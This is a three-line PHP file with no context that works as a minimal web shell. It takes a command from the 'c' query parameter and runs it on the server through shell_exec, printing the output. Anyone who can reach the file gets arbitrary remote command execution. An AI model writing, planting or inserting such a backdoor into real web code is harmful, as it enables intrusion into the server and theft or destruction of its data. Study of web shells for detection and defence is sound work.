<?php
$cmd = $_GET['c'] ?? 'echo hello';
echo shell_exec($cmd . " 2>&1");
